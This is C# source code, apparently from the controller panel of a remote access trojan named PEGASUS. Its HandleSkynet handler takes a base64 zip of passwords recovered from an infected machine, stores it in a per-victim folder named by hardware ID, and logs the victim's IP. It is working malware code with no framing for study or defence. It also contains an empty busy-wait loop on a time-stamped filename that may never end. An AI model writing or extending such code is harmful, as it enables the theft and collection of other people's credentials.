using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using PEGASUS.Connection;
using PEGASUS.Forms;
using PEGASUS.MessagePack;

namespace PEGASUS.Handle_Packet
	{
public class HandleSkynet
{
	public HandleSkynet(Clients client, MsgPack unpack_msgpack)
	{
		try
		{
			string text = Path.Combine(Application.StartupPath, "ClientsFolder", unpack_msgpack.ForcePathObject("Hwid").AsString, "Recovery");
			string asString = unpack_msgpack.ForcePathObject("Zip").AsString;
			if (!string.IsNullOrWhiteSpace(asString))
			{
				if (!Directory.Exists(text))
				{
					Directory.CreateDirectory(text);
				}
				File.WriteAllBytes(Path.Combine(text, "Password_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".zip"), Convert.FromBase64String(asString));
				new HandleLogs().Addmsg("Client " + client.Ip + " password recovered success，file located @ ClientsFolder \\ " + unpack_msgpack.ForcePathObject("Hwid").AsString + " \\ Recovery", Color.Purple);
				while (!File.Exists(text + "\\Password_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".zip"))
				{
				}
				using FrmSkynet frmSkynet = new FrmSkynet();
				frmSkynet.ShowDialog();
				return;
			}
			new HandleLogs().Addmsg("Client " + client.Ip + " password recoveried error", Color.MediumPurple);
		}
		catch (Exception ex)
		{
			new HandleLogs().Addmsg(ex.Message, Color.Red);
		}
	}
}
}